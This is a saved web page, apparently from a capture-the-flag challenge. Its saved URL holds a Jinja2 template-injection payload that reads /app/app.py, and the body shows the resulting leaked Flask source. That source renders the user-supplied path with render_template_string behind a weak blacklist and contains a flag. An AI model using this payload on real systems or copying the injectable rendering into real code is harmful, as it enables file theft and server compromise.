
<!-- saved from url=(0111)http://149.56.110.180:5000/%7B%7B%20''.__class__.__mro__[2].__subclasses__()[40]('/app/app.py').read()%20%7D%7D -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body>import flask
import os
from flask import render_template


app = flask.Flask(__name__)
app.config['FL44G'] = 'HZVII{n0t_S3cure_fl4sK_4pp}'


@app.route('/<path:index>')
def index(index):
    def secure(s):
        s = s.replace('(', ' (').replace(')', ')')
        
        blacklist = ['config','self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s
    if(flask.render_template_string(secure(index))=='None'):
        return 'Nice Try !!'
    else:

            return flask.render_template_string(secure(index))


@app.route('/')
def index1():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
</path:index></body></html>